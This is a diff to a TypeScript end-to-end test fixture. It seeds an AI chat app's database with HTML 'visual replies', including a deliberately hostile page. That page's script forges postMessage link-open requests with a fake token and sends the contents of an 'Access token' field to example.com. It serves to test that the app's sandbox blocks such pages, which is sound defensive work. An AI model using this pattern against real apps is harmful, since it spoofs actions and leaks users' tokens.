@@ -102,6 +102,104 @@ export const COMPARISON_TABLE_PAGE = `<!doctype html>
 </body>
 </html>`;
 
+export const HOSTILE_PAGE_TITLE = "Hostile page";
+export const HOSTILE_PAGE_LINK = "https://example.com/clicked";
+export const SCOPED_PAGE_TITLE = "Scoped page";
+export const FOREIGN_PAGE_TITLE = "Foreign page";
+
+const FORGED_TOKEN = "0".repeat(32);
+
+export const HOSTILE_PAGE = `<!doctype html>
+<html lang="en">
+<head><title>Hostile</title></head>
+<body>
+  <h2>${HOSTILE_PAGE_TITLE}</h2>
+  <p><a id="real" href="${HOSTILE_PAGE_LINK}">Real link</a></p>
+  <p><button id="fake" type="button">Not a link</button></p>
+  <p><input id="secret" aria-label="Access token"></p>
+  <script>
+    window.__inertiaE2eMarker = "kept";
+    const post = (message) => parent.postMessage(message, "*");
+    post({ type: "inertia-html-render:hello", token: "${FORGED_TOKEN}" });
+    const forge = (url) => {
+      post({ type: "inertia-html-render:open-link", url });
+      post({ type: "inertia-html-render:open-link", url, token: "${FORGED_TOKEN}" });
+    };
+    document.getElementById("fake").addEventListener("click", () => forge("https://example.com/forged-click"));
+    document.getElementById("real").addEventListener("click", () => forge("https://example.com/forged-second"));
+    document.getElementById("secret").addEventListener("keydown", (event) => {
+      if (event.key === "Enter") forge("https://example.com/?t=" + encodeURIComponent(event.target.value));
+    });
+  </script>
+</body>
+</html>`;
+
+function simplePage(heading: string): string {
+  return `<!doctype html><html lang="en"><head><title>${heading}</title></head><body><h2>${heading}</h2></body></html>`;
+}
+
+interface SeededPage {
+  title: string;
+  html: string;
+  height: number;
+}
+
+function openStore(testDirectory: string, workspaceDirectory: string): RuntimeStore {
+  return new RuntimeStore(join(testDirectory, "data", "inertia.sqlite"), workspaceDirectory, { recoverInterruptedRuns: false });
+}
+
+function seedTurnWithPages(
+  store: RuntimeStore,
+  conversationId: string,
+  runId: string,
+  pages: readonly SeededPage[],
+  answer: string,
+): string[] {
+  const selection = providerNativeModelSelection({
+    providerId: "codex",
+    modelId: "gpt-5.6",
+    alias: "GPT-5.6",
+    reasoningEffort: "high",
+  });
+  const requestedAt = new Date(Date.now() - 5 * 60_000).toISOString();
+  const startedAt = new Date(Date.parse(requestedAt) + 2_000).toISOString();
+  const { turn } = store.beginAgentTurn({
+    conversationId,
+    runId,
+    content: "Mock the settled row treatment and compare it with the other two options.",
+    providerId: "codex",
+    modelSelection: selection,
+    reasoningEffort: selection.reasoningEffort ?? "",
+    interactionMode: "build",
+    accessMode: "supervised",
+    configurationRevision: selection.backendConfigurationRevision,
+    association: "authoritative",
+    requestedAt,
+  });
+  store.updateAgentTurnLifecycle(turn.id, { status: "running", startedAt, updatedAt: startedAt });
+  const at = (seconds: number): string => new Date(Date.parse(startedAt) + seconds * 1_000).toISOString();
+  const renderIds = pages.map((page, index) => store.htmlRenders.create({
+    conversationId, runId: turn.runId, turnId: turn.id,
+    title: page.title, html: page.html, height: page.height, createdAt: at(30 + index * 4),
+  }).renderId);
+  const completedAt = at(42);
+  const message = store.createMessage(conversationId, answer, "assistant", [], turn.id, completedAt);
+  store.updateAgentTurnLifecycle(turn.id, {
+    status: "completed",
+    completedAt,
+    updatedAt: completedAt,
+    terminalAssistantMessageId: message.id,
+    terminalReason: "provider-completed",
+  });
+  return renderIds;
+}
+
+function activeConversationId(store: RuntimeStore): string {
+  const conversationId = store.shellSnapshot().activeConversationId;
+  if (!conversationId) throw new Error("The visual reply fixture needs a seeded conversation.");
+  return conversationId;
+}
+
 /** Seeds one completed turn with two visual replies above its final answer, in dark mode. */
 export function seedHtmlRenderConversation({
   testDirectory,
@@ -110,55 +208,57 @@ export function seedHtmlRenderConversation({
   testDirectory: string;
   workspaceDirectory: string;
 }): void {
-  const store = new RuntimeStore(
-    join(testDirectory, "data", "inertia.sqlite"),
-    workspaceDirectory,
-    { recoverInterruptedRuns: false },
-  );
+  const store = openStore(testDirectory, workspaceDirectory);
   try {
-    const conversationId = store.shellSnapshot().activeConversationId;
-    if (!conversationId) throw new Error("The visual reply fixture needs a seeded conversation.");
+    const conversationId = activeConversationId(store);
     store.updateSettings({ theme: "dark", interfaceScale: "default", responseDensity: "default" });
-    const selection = providerNativeModelSelection({
-      providerId: "codex",
-      modelId: "gpt-5.6",
-      alias: "GPT-5.6",
-      reasoningEffort: "high",
-    });
-    const requestedAt = new Date(Date.now() - 5 * 60_000).toISOString();
-    const startedAt = new Date(Date.parse(requestedAt) + 2_000).toISOString();
-    const { turn } = store.beginAgentTurn({
-      conversationId,
-      runId: "html-render-e2e-run",
-      content: "Mock the settled row treatment and compare it with the other two options.",
-      providerId: "codex",
-      modelSelection: selection,
-      reasoningEffort: selection.reasoningEffort ?? "",
-      interactionMode: "build",
-      accessMode: "supervised",
-      configurationRevision: selection.backendConfigurationRevision,
-      association: "authoritative",
-      requestedAt,
-    });
-    store.updateAgentTurnLifecycle(turn.id, { status: "running", startedAt, updatedAt: startedAt });
-    const at = (seconds: number): string => new Date(Date.parse(startedAt) + seconds * 1_000).toISOString();
-    store.htmlRenders.create({
-      conversationId, runId: turn.runId, turnId: turn.id,
-      title: HTML_RENDER_TITLE, html: SETTLED_ROW_PAGE, height: 320, createdAt: at(30),
-    });
-    store.htmlRenders.create({
-      conversationId, runId: turn.runId, turnId: turn.id,
-      title: HTML_RENDER_TABLE_TITLE, html: COMPARISON_TABLE_PAGE, height: 160, createdAt: at(34),
-    });
-    const completedAt = at(42);
-    const answer = store.createMessage(conversationId, HTML_RENDER_ANSWER, "assistant", [], turn.id, completedAt);
-    store.updateAgentTurnLifecycle(turn.id, {
-      status: "completed",
-      completedAt,
-      updatedAt: completedAt,
-      terminalAssistantMessageId: answer.id,
-      terminalReason: "provider-completed",
-    });
+    seedTurnWithPages(store, conversationId, "html-render-e2e-run", [
+      { title: HTML_RENDER_TITLE, html: SETTLED_ROW_PAGE, height: 320 },
+      { title: HTML_RENDER_TABLE_TITLE, html: COMPARISON_TABLE_PAGE, height: 160 },
+    ], HTML_RENDER_ANSWER);
+  } finally {
+    store.close();
+  }
+}
+
+/** Seeds one completed turn whose only visual reply tries to act on the app by itself. */
+export function seedHostileHtmlRenderConversation({
+  testDirectory,
+  workspaceDirectory,
+}: {
+  testDirectory: string;
+  workspaceDirectory: string;
+}): void {
+  const store = openStore(testDirectory, workspaceDirectory);
+  try {
+    seedTurnWithPages(store, activeConversationId(store), "html-render-hostile-run", [
+      { title: HOSTILE_PAGE_TITLE, html: HOSTILE_PAGE, height: 240 },
+    ], HTML_RENDER_ANSWER);
+  } finally {
+    store.close();
+  }
+}
+
+/** Seeds a page in the active chat and another in a second chat; returns both render ids. */
+export function seedScopedHtmlRenderConversations({
+  testDirectory,
+  workspaceDirectory,
+}: {
+  testDirectory: string;
+  workspaceDirectory: string;
+}): { scopedRenderId: string; foreignRenderId: string } {
+  const store = openStore(testDirectory, workspaceDirectory);
+  try {
+    const conversationId = activeConversationId(store);
+    const projectId = store.conversation(conversationId).projectId;
+    const [scopedRenderId] = seedTurnWithPages(store, conversationId, "html-render-scoped-run", [
+      { title: SCOPED_PAGE_TITLE, html: simplePage(SCOPED_PAGE_TITLE), height: 160 },
+    ], HTML_RENDER_ANSWER);
+    const other = store.createConversation(projectId, "Other chat", { activate: false });
+    const [foreignRenderId] = seedTurnWithPages(store, other.id, "html-render-foreign-run", [
+      { title: FOREIGN_PAGE_TITLE, html: simplePage(FOREIGN_PAGE_TITLE), height: 160 },
+    ], HTML_RENDER_ANSWER);
+    return { scopedRenderId: scopedRenderId!, foreignRenderId: foreignRenderId! };
   } finally {
     store.close();
   }
